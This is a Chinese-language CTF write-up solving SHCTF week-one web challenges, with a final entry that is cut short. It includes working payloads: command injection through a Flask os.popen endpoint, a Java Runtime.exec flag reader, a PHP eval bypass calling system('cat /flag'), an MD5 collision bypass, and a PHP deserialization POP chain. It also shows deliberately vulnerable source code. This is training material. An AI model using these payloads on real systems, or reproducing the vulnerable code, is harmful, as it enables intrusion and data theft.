# Web

## SHCTF 

### **[week1]ez_flask**

查看robots.txt，看到提示

```
User-agent: *
Disallow: /s3recttt
```

访问/s3recttt，得到源代码

```python
import os
import flask
from flask import Flask, request, send_from_directory, send_file

app = Flask(name)

@app.route('/api')
def api():
    cmd = request.args.get('SSHCTFF', 'ls /')
    result = os.popen(cmd).read()
    return result
    
@app.route('/robots.txt')
def static_from_root():
    return send_from_directory(app.static_folder,'robots.txt')
    
@app.route('/s3recttt')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)

if name == 'main':
    app.run(debug=True)
```

直接注入即可 

```
/api?SSHCTFF=cat /flag
```



### **[Week1] MD5 Master**

```php
<?php
highlight_file(__file__);

$master = "MD5 master!";

if(isset($_POST["master1"]) && isset($_POST["master2"])){
    if($master.$_POST["master1"] !== $master.$_POST["master2"] && md5($master.$_POST["master1"]) === md5($master.$_POST["master2"])){
        echo $master . "<br>";
        echo file_get_contents('/flag');
    }
}
else{
    die("master? <br>");
}

```

工具：fastcoll

由代码可知，脚本通过

```
$master.$_POST["master1"]
```

将**MD5 master!**与post传入的**master1**和**master2**分别拼接后进行md5的强比较，要求拼接后的字符不相等且md5相等

工具使用方法：[教程](https://blog.csdn.net/m0_68483928/article/details/141252221)

md5转换php脚本：

```php
<?php 
function  readmyfile($path){
    $fh = fopen($path, "rb");
    $data = fread($fh, filesize($path));
    fclose($fh);
    return $data;
}
echo '二进制md5加密 '. md5( (readmyfile("1_msg1.txt")));

echo  'url编码 '. urlencode(readmyfile("1_msg1.txt"));

echo '二进制md5加密 '.md5( (readmyfile("1_msg2.txt")));

echo  'url编码 '.  urlencode(readmyfile("1_msg2.txt"));
```

*复制粘贴计算容易出问题*，故使用php脚本

计算结果删除掉MD5 master!后将结果post即可得到flag

### **[Week1] jvav**

显示在线执行java代码

写一个java脚本执行系统命令即可

官方题解：

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

class demo{
    public static void main(String[] args) {
        try {
            Process process = Runtime.getRuntime().exec("cat /flag");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            process.waitFor();
            reader.close();
        } catch (Exception e) {
        }
    }
}
```

### **[Week1] ez_gittt**

查看源码发现有暗示

```
<!--你说这个Rxuxin会不会喜欢把自己的秘密写到git之类什么的--> 
```

dirsearch扫一下发现网站存在git泄漏，用Githack将git打包下载下来

查看log发现该版本去除了flag，需要进行版本回滚



<img src="/Users/xrntstudio/Library/Application Support/typora-user-images/截屏2024-10-24 00.30.56.png" alt="官方题解" style="zoom:50%;" />

得到flag

### **[Week1]单身十八年的手速**

官方题解：需要点击超过520次拿到flag，查看页面源代码，引用了game.js，查看game.js的内容，发现是混淆过后的js，无需去混淆，直接定位520的hex值0x208，发现后面就是**alert**了一段字符串，base64解密拿到flag，有经验的可以直接定位**alert**



### **[Week1] 蛐蛐？蛐蛐！**

查看网页源代码，发现有暗示

```html
<!--听说，k1留了fault不想让你看到的源码在source.txt中-->
```

查看源码

```php
<?php
if($_GET['ququ'] == 114514 && strrev($_GET['ququ']) != 415411){
    if($_POST['ququ']!=null){
        $eval_param = $_POST['ququ'];
        if(strncmp($eval_param,'ququk1',6)===0){
            eval($_POST['ququ']);
        }else{
            echo("可以让fault的蛐蛐变成现实么\n");
        }
    }
    echo("蛐蛐成功第一步！\n");

}
else{
    echo("呜呜呜fault还是要出题");
}
```

观察源码

第一步根据php特性通过get传入**114514a**或者通过科学计数法即可绕过

第二步通过分号隔断即可，post传入**ququ=ququk1;system('cat /flag')**

### **[Week1] poppopop**

这个真不会，先放官方题解：

```php
<?php
class SH {

  public static $Web = false;
  public static $SHCTF = false;
}
class C {
  public $p;

  public function flag()
  {
    ($this->p)();
  }
}
class T{

  public $n;
  public function __destruct()
  {

    SH::$Web = true;
    echo "11";
  }
}
class F {
  public $o;
  public function __toString()
  {
    SH::$SHCTF = true;
    $this->o->flag();
    return "其实。。。。,";
  }
}
class SHCTF {
  public $isyou="system";
  public $flag="cat /f*";
  public function __invoke()
  {
    if (SH::$Web) {

      ($this->isyou)($this->flag);
      echo "小丑竟是我自己呜呜呜~";
    } else {
      echo "小丑别看了!";
    }
  }
}
$a =new T();
$a->n=new F();
$a->n->o=new C();
$a->n->o->p=new SHCTF();
echo base64_encode(serialize($a));
```



### **[Week2]guess_the_number**

查看网页源码，发现/s0urce，访问获得题目源码

```html
<!-- 看源码是做题的好习惯 -->  
<!-- /s0urce -->  
```

